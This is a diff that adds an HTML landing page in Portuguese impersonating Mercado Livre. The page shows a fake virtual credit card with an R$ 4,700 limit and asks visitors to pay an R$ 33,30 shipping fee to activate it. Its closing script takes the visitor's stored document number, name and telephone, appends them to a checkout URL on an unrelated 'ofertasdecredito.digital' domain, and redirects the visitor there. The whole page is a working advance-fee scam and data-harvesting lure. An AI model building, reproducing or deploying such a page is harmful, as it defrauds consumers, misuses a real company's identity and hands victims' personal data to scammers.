@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="css/GyajTltF4V1w.css">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <title>Cartão Virtual</title>
+
+    <script src="../../../cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+   <script>
+  window.pixelId = "68dc9a692aa590745b1509ad";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Sora', sans-serif;
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #e6b800;
+            background-color: #FFE600;
+        }
+
+        .logo {
+            width: 125px;
+            padding: 10px;
+            margin-left: 20px;
+        }
+
+        .content {
+            flex: 1;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .limite-text {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .limite-valor {
+            text-align: center;
+            font-size: 36px;
+            font-weight: bold;
+            color: #ffbf00;
+            margin-bottom: 20px;
+        }
+
+        .card {
+            background: linear-gradient(45deg, #e6b800, #fff159);
+            border-radius: 15px;
+            padding: 20px;
+            height: 165px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .card-top {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 100px;
+        }
+
+        .card-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+
+        .card-name {
+            font-family: 'Sora', sans-serif;
+            font-size: 14px;
+            color: white;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 30px;
+        }
+
+        .footer p {
+            font-family: 'Sora', sans-serif;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .button {
+            background: #FFE600;
+            color: black;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            box-sizing: border-box;
+            margin-top: 20px;
+        }
+
+        .button:hover {
+            background: #e6b800;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://i.ibb.co/sp4Np7Yq/oie-transparent.png" alt="Logo Mercado Livre" class="logo">
+    </div>
+
+    <div class="content">
+        <div class="limite-text">Seu Limite Disponível</div>
+        <div class="limite-valor">R$ 4.700</div>
+
+        <div class="card">
+            <!-- Efeito de brilho no cartão -->
+            <div style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;"></div>
+            <style>
+                @keyframes shine {
+                    0% { left: -100%; }
+                    20% { left: 100%; }
+                    100% { left: 100%; }
+                }
+            </style>
+
+            <!-- Faixa magnética -->
+            <div style="position: absolute; top: 20px; left: 0; width: 100%; height: 50px; background-color: #5a5a5a; z-index: 2;"></div>
+
+            <!-- Número do cartão -->
+            <div style="position: absolute; top: 47.5%; left: 20px; transform: translateY(-50%);">
+                <div style="color: rgb(255, 255, 255); font-size: 24px; letter-spacing: 4px; font-family: 'Sora', sans-serif; text-shadow: 0 2px 4px rgba(0,0,0,0.2);">
+                    4532 •••• •••• ••••
+                </div>
+            </div>
+
+            <!-- Área de assinatura e validade -->
+            <div style="position: absolute; top: 125px; left: 0; width: 100%; display: flex; justify-content: space-between; z-index: 2; padding: 0 20px; box-sizing: border-box;">
+                <div style="display: flex; flex-direction: column;">
+                    <span style="color: white; font-size: 10px; margin-bottom: 5px; text-shadow: 0 1px 2px rgba(0,0,0,0.3);">VALIDADE</span>
+                    <span style="color: white; font-size: 14px; font-weight: bold; text-shadow: 0 1px 2px rgba(0,0,0,0.3);">12/28</span>
+                </div>
+            </div>
+
+            <div style="position: absolute; top: 125px; right: 20px; padding-right: 5px; width: calc(100% - 120px); height: 40px; background-color: rgba(255,255,255,0.9); border-radius: 4px; z-index: 2; display: flex; align-items: center;">
+                <div style="width: 80%; height: 20px; margin-left: 10px; background-image: repeating-linear-gradient(45deg, #ccc, #ccc 5px, #eee 5px, #eee 10px);"></div>
+                <div style="width: 50px; height: 30px; margin-left: 5px;  background-color: white; border-radius: 3px; display: flex; justify-content: center; align-items: center;">
+                    <span style="color: #333; font-size: 14px; font-weight: bold;">719</span>
+                </div>
+            </div>
+
+            <!-- Padrão de segurança no fundo do cartão -->
+            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(255,255,255,0.03) 0px, rgba(255,255,255,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;"></div>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <h2 style="font-size: 18px; margin-bottom: 5px;">Finalize o envio do seu cartão</h2>
+            <p style="color: #666; font-size: 14px; margin-bottom: 25px;">
+                Pague o frete para receber o cartão físico e ativar o cartão virtual agora mesmo.
+            </p>
+
+            <div style="text-align: center; font-size: 28px; font-weight: bold; color: #ffbf00;">
+                R$ 33,30
+            </div>
+
+            <!-- BOTÃO ATUALIZADO -->
+            <button class="button">
+                Pagar Frete
+            </button>
+
+            <div style="text-align: center; margin-top: 15px;">
+                <i class="fas fa-lock" style="font-size: 20px; color: #28a745; vertical-align: middle;"></i>
+                <span style="color: #28a745; font-size: 14px; margin-left: 5px;">Pagamento 100% seguro</span>
+            </div>
+        </div>
+    </div>
+
+    <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+        <div style="max-width: 600px; margin: 0 auto;">
+            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                Mercado Livre Brasil LTDA | CNPJ: 79.379.491.0008-50
+            </p>
+            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
+            </p>
+            <p style="color: #999; font-size: 9px; margin-top: 5px;">
+                © 2025 - Todos os direitos reservados
+            </p>
+        </div>
+    </footer>
+
+    <script>
+        // Função única para construir URL final com todos os parâmetros
+        function buildFinalUrl(targetUrl) {
+            const allParams = JSON.parse(localStorage.getItem('urlParams') || '{}');
+            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+            const url = new URL(targetUrl);
+
+            Object.keys(allParams).forEach(key => {
+                if (key !== 'document' && key !== 'name' && key !== 'telephone') {
+                    url.searchParams.append(key, allParams[key]);
+                }
+            });
+
+            if (userData.document) url.searchParams.append('document', userData.document);
+            if (userData.name) url.searchParams.append('name', userData.name);
+            if (allParams.telephone) url.searchParams.append('telephone', allParams.telephone);
+
+            return url.toString();
+        }
+
+        // Evento para o botão
+        document.addEventListener('DOMContentLoaded', function() {
+            const button = document.querySelector('.button');
+            if (button) {
+                button.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    this.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 10px;"></i>Encaminhando para pagamento';
+                    const finalUrl = buildFinalUrl('https://pagamento.ofertasdecredito.digital/checkout/product/01k7mzh0rggtwb8pbq4j1gnwmp');
+                    window.location.href = finalUrl;
+                });
+            }
+        });
+    </script>
+</body>
+</html>
